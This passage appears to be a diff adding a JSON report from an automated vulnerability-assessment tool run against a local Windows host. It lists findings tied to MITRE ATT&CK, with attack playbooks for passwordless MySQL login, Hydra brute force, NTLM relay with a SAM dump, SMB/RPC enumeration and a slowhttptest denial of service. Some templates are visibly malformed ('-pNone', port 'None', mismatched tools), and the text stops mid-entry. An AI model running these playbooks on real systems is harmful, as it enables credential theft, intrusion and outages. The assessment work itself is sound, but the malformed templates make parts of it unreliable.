@@ -1,0 +1,3773 @@
+{
+  "meta": {
+    "rvc_version": "1.0.0",
+    "target": {
+      "ip": "127.0.0.1",
+      "hostname": "Pro_Magnus_M",
+      "os": "Windows 10.0.26200"
+    },
+    "mitre_snapshot": "2026-05-01",
+    "mitre_sources": [
+      "nvd.nist.gov",
+      "cwe.mitre.org",
+      "capec.mitre.org",
+      "attack.mitre.org"
+    ],
+    "generated_with_llm": false,
+    "reachable_ports": [
+      135,
+      445,
+      902,
+      912,
+      2343,
+      3306,
+      3580,
+      4096,
+      5040,
+      7680
+    ],
+    "counts": {
+      "attack_vectors": 44,
+      "realizable": 11,
+      "partially": 13,
+      "not_realizable": 20
+    }
+  },
+  "realizable_vulnerabilities": [
+    {
+      "attack_name": "MySQL No Auth Check",
+      "attack_vector_id": "AV-MYSQL-NOAUTH",
+      "attack_type": "authentication_bypass",
+      "severity": "CRITICAL",
+      "port": 3306,
+      "service": "MySQL",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 3306 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 3306 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1556",
+            "name": "Modify Authentication Process",
+            "tactic": "Credential Access",
+            "description": "Обход или изменение механизма аутентификации."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "mysql",
+        "version_observed": "8.0.43",
+        "system_component": "СУБД MySQL",
+        "impact_if_exploited": "Обход аутентификации и доступ к защищённой функциональности."
+      },
+      "playbook": {
+        "tools": [
+          "mysql client"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Подключиться без аутентификации",
+            "command": "mysql -h 127.0.0.1 -P 3306 -u root --skip-password",
+            "expected_result": "Получен доступ без пароля"
+          },
+          {
+            "n": 2,
+            "action": "Проверить привилегии",
+            "command": "SHOW GRANTS; SELECT current_user();",
+            "expected_result": "Подтверждены доступные права"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "DCOM Exploitation",
+      "attack_vector_id": "AV-RPC-DCOM",
+      "attack_type": "remote_code_execution",
+      "severity": "HIGH",
+      "port": 135,
+      "service": "RPC",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 135 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "RPC (порт 135) — штатный сетевой сервис Windows"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "rpc",
+        "version_observed": "",
+        "system_component": "Подсистема RPC/DCOM (удалённый вызов процедур Windows)",
+        "impact_if_exploited": "Удалённое выполнение произвольного кода, потенциально с системными привилегиями; полный контроль над узлом."
+      },
+      "playbook": {
+        "tools": [
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p135 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 135"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit RPC",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "SMB Relay Attack",
+      "attack_vector_id": "AV-SMB-RELAY",
+      "attack_type": "credential_theft",
+      "severity": "HIGH",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1003",
+            "name": "OS Credential Dumping",
+            "tactic": "Credential Access",
+            "description": "Извлечение учётных данных из ОС."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "smb",
+        "version_observed": "",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Кража учётных данных пользователей или служб."
+      },
+      "playbook": {
+        "tools": [
+          "Impacket",
+          "Responder"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Запустить перехватчик",
+            "command": "responder -I <iface> -wrf",
+            "expected_result": "Сбор NetNTLM-хэшей из широковещательных запросов"
+          },
+          {
+            "n": 2,
+            "action": "Ретранслировать аутентификацию",
+            "command": "ntlmrelayx.py -t smb://127.0.0.1 -smb2support",
+            "expected_result": "Сессия от имени жертвы / дамп SAM"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "MySQL Brute Force",
+      "attack_vector_id": "AV-MYSQL-BRUTE",
+      "attack_type": "brute_force",
+      "severity": "HIGH",
+      "port": 3306,
+      "service": "MySQL",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 3306 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 3306 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1110",
+            "name": "Brute Force",
+            "tactic": "Credential Access",
+            "description": "Систематический подбор учётных данных."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "mysql",
+        "version_observed": "8.0.43",
+        "system_component": "СУБД MySQL",
+        "impact_if_exploited": "Подбор учётных данных и несанкционированный доступ к сервису."
+      },
+      "playbook": {
+        "tools": [
+          "Hydra"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис и версию",
+            "command": "nmap -p3306 -sV 127.0.0.1",
+            "expected_result": "Подтверждён mysql на порту 3306"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать учётные данные",
+            "command": "hydra -L users.txt -P passwords.txt mysql://127.0.0.1:3306",
+            "expected_result": "Найдена валидная пара логин/пароль"
+          },
+          {
+            "n": 3,
+            "action": "Войти под подобранными данными",
+            "command": "mysql -h 127.0.0.1 -P 3306 -u <user> -p",
+            "expected_result": "Получено приглашение MySQL"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "NTLM Hash Passback",
+      "attack_vector_id": "AV-WIN-PASSBACK",
+      "attack_type": "credential_theft",
+      "severity": "HIGH",
+      "port": 445,
+      "service": "Windows SMB",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1003",
+            "name": "OS Credential Dumping",
+            "tactic": "Credential Access",
+            "description": "Извлечение учётных данных из ОС."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "smb",
+        "version_observed": "",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Кража учётных данных пользователей или служб."
+      },
+      "playbook": {
+        "tools": [
+          "Responder",
+          "Impacket"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p445 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 445"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit Windows SMB",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "SMB Signing Disabled",
+      "attack_vector_id": "AV-SMB-SIGN",
+      "attack_type": "man_in_the_middle",
+      "severity": "MEDIUM",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Требует подтверждения, что SMB signing действительно отключён"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1557",
+            "name": "Adversary-in-the-Middle",
+            "tactic": "Credential Access",
+            "description": "Перехват/подмена сетевого трафика (например, SMB Relay, NBT-NS/LLMNR)."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "smb",
+        "version_observed": "",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Перехват и ретрансляция аутентификации, доступ от имени жертвы."
+      },
+      "playbook": {
+        "tools": [
+          "CrackMapExec"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Запустить перехватчик",
+            "command": "responder -I <iface> -wrf",
+            "expected_result": "Сбор NetNTLM-хэшей из широковещательных запросов"
+          },
+          {
+            "n": 2,
+            "action": "Ретранслировать аутентификацию",
+            "command": "ntlmrelayx.py -t smb://127.0.0.1 -smb2support",
+            "expected_result": "Сессия от имени жертвы / дамп SAM"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "SMB Null Session",
+      "attack_vector_id": "AV-SMB-NULL",
+      "attack_type": "information_disclosure",
+      "severity": "MEDIUM",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1046",
+            "name": "Network Service Discovery",
+            "tactic": "Discovery",
+            "description": "Перечисление сетевых сервисов и портов для поиска точек входа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "smb",
+        "version_observed": "",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Раскрытие сведений о системе, ресурсах и учётных записях, полезных для последующих атак."
+      },
+      "playbook": {
+        "tools": [
+          "rpcclient",
+          "enum4linux"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Перечислить SMB-ресурсы",
+            "command": "smbclient -L //127.0.0.1/ -N",
+            "expected_result": "Список доступных общих папок"
+          },
+          {
+            "n": 2,
+            "action": "Глубокая инвентаризация",
+            "command": "enum4linux -a 127.0.0.1",
+            "expected_result": "Пользователи, политики, ресурсы"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "RPC Enumeration",
+      "attack_vector_id": "AV-RPC-ENUM",
+      "attack_type": "information_disclosure",
+      "severity": "LOW",
+      "port": 135,
+      "service": "RPC",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 135 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "RPC (порт 135) — штатный сетевой сервис Windows"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1046",
+            "name": "Network Service Discovery",
+            "tactic": "Discovery",
+            "description": "Перечисление сетевых сервисов и портов для поиска точек входа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "rpc",
+        "version_observed": "",
+        "system_component": "Подсистема RPC/DCOM (удалённый вызов процедур Windows)",
+        "impact_if_exploited": "Раскрытие сведений о системе, ресурсах и учётных записях, полезных для последующих атак."
+      },
+      "playbook": {
+        "tools": [
+          "rpcclient"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Перечислить RPC-интерфейсы",
+            "command": "rpcclient -U '' -N 127.0.0.1",
+            "expected_result": "Доступны srvinfo / enumdomusers"
+          },
+          {
+            "n": 2,
+            "action": "Снять сведения о домене и пользователях",
+            "command": "rpcclient> enumdomusers; querydominfo",
+            "expected_result": "Список пользователей и параметров домена"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "SMB Enumeration",
+      "attack_vector_id": "AV-SMB-ENUM",
+      "attack_type": "information_disclosure",
+      "severity": "LOW",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1046",
+            "name": "Network Service Discovery",
+            "tactic": "Discovery",
+            "description": "Перечисление сетевых сервисов и портов для поиска точек входа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "smb",
+        "version_observed": "",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Раскрытие сведений о системе, ресурсах и учётных записях, полезных для последующих атак."
+      },
+      "playbook": {
+        "tools": [
+          "Enum4linux",
+          "SMBClient"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Перечислить SMB-ресурсы",
+            "command": "smbclient -L //127.0.0.1/ -N",
+            "expected_result": "Список доступных общих папок"
+          },
+          {
+            "n": 2,
+            "action": "Глубокая инвентаризация",
+            "command": "enum4linux -a 127.0.0.1",
+            "expected_result": "Пользователи, политики, ресурсы"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] MySQL Info - Enumeration",
+      "attack_vector_id": "mysql-info",
+      "attack_type": "",
+      "severity": "UNKNOWN",
+      "port": 3306,
+      "service": "",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 3306 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 3306 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "mysql",
+        "version_observed": "8.0.43",
+        "system_component": "СУБД MySQL",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "smbclient",
+          "enum4linux"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Перечислить SMB-ресурсы",
+            "command": "smbclient -L //127.0.0.1/ -N",
+            "expected_result": "Список доступных общих папок"
+          },
+          {
+            "n": 2,
+            "action": "Глубокая инвентаризация",
+            "command": "enum4linux -a 127.0.0.1",
+            "expected_result": "Пользователи, политики, ресурсы"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "[NUCLEI] VMware Authentication Daemon Detection",
+      "attack_vector_id": "vmware-authentication-daemon",
+      "attack_type": "",
+      "severity": "UNKNOWN",
+      "port": 902,
+      "service": "",
+      "verdict": "realizable",
+      "confidence": 0.7,
+      "reason": "Достижим снаружи, сервис активен, версия уязвима либо не опровергнута",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 902 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 902 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": []
+      },
+      "target_software": {
+        "product": "vmware-authd",
+        "version_observed": "1.10",
+        "system_component": "VMware Workstation — демон аутентификации (vmware-authd)",
+        "impact_if_exploited": "Компрометация целевого сервиса."
+      },
+      "playbook": {
+        "tools": [],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p902 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 902"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit [NUCLEI] VMware Authentication Daemon Detection",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    }
+  ],
+  "partially_realizable": [
+    {
+      "attack_name": "CVE-2020-3992 — VMware",
+      "attack_vector_id": "AV-CVE-CVE-2020-3992",
+      "attack_type": "known_vulnerability",
+      "severity": "HIGH",
+      "port": 902,
+      "service": "VMware",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Нет данных о версии для CVE-2020-3992 — нужна ручная проверка",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 902 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 902 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "unknown",
+          "evidence": "Нет данных о версии для CVE-2020-3992 — нужна ручная проверка"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2020-3992",
+            "name": "",
+            "description": "Нет в локальном срезе MITRE — требуется выгрузка из NVD.",
+            "cvss": null,
+            "cpe_affected": ""
+          }
+        ],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1190",
+            "name": "Exploit Public-Facing Application",
+            "tactic": "Initial Access",
+            "description": "Эксплуатация уязвимости публично доступного приложения для первичного доступа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "vmware-authd",
+        "version_observed": "1.10",
+        "system_component": "VMware Workstation — демон аутентификации (vmware-authd)",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -p902 -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту 902"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit VMware",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "SAM Database Extraction",
+      "attack_vector_id": "AV-WIN-SAM",
+      "attack_type": "credential_theft",
+      "severity": "HIGH",
+      "port": null,
+      "service": "Windows",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту None напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1003",
+            "name": "OS Credential Dumping",
+            "tactic": "Credential Access",
+            "description": "Извлечение учётных данных из ОС."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Windows",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Кража учётных данных пользователей или служб."
+      },
+      "playbook": {
+        "tools": [
+          "Mimikatz",
+          "secretsdump"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit Windows",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "Kerberoasting",
+      "attack_vector_id": "AV-WIN-KERBEROAST",
+      "attack_type": "credential_theft",
+      "severity": "HIGH",
+      "port": null,
+      "service": "Windows AD",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту None напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1003",
+            "name": "OS Credential Dumping",
+            "tactic": "Credential Access",
+            "description": "Извлечение учётных данных из ОС."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Windows AD",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Кража учётных данных пользователей или служб."
+      },
+      "playbook": {
+        "tools": [
+          "Rubeus",
+          "Invoke-Kerberoast"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Идентифицировать сервис и версию",
+            "command": "nmap -pNone -sV 127.0.0.1",
+            "expected_result": "Определены продукт и версия на порту None"
+          },
+          {
+            "n": 2,
+            "action": "Подобрать публичный эксплойт",
+            "command": "searchsploit Windows AD",
+            "expected_result": "Найден подходящий PoC/модуль"
+          },
+          {
+            "n": 3,
+            "action": "Выполнить и зафиксировать результат",
+            "command": "<запуск эксплойта согласно PoC>",
+            "expected_result": "Достигнут эффект, заявленный в описании атаки"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "Denial of Service",
+      "attack_vector_id": "AV-DOS-GENERIC",
+      "attack_type": "denial_of_service",
+      "severity": "MEDIUM",
+      "port": null,
+      "service": "generic",
+      "verdict": "partially",
+      "confidence": 0.45,
+      "reason": "Сервис на порту None напрямую не подтверждён",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "unknown",
+          "evidence": "Вектор не привязан к конкретному порту"
+        },
+        {
+          "name": "service_enabled",
+          "status": "warn",
+          "evidence": "Сервис на порту None напрямую не подтверждён"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "na",
+          "evidence": "Вектор без CVE — проверка версии не применяется"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [],
+        "cwe": [],
+        "capec": [],
+        "attack": [
+          {
+            "id": "T1499",
+            "name": "Endpoint Denial of Service",
+            "tactic": "Impact",
+            "description": "Отказ в обслуживании конечного узла через исчерпание ресурсов."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "generic",
+        "version_observed": "",
+        "system_component": "Сетевой сервис на порту None",
+        "impact_if_exploited": "Отказ в обслуживании: сервис или узел становится недоступен."
+      },
+      "playbook": {
+        "tools": [
+          "hping3",
+          "LOIC"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Запустить нагрузочную атаку",
+            "command": "slowhttptest -c 1000 -H -u http://127.0.0.1:None",
+            "expected_result": "Рост числа удерживаемых соединений"
+          },
+          {
+            "n": 2,
+            "action": "Зафиксировать отказ",
+            "command": "curl -m 5 http://127.0.0.1:None",
+            "expected_result": "Сервис перестаёт отвечать (timeout)"
+          }
+        ],
+        "source": "шаблон по типу атаки"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "Large Attack Surface",
+      "attack_vector_id": "AV-SURFACE-LARGE",
+      "attack_type": "misconfiguration",
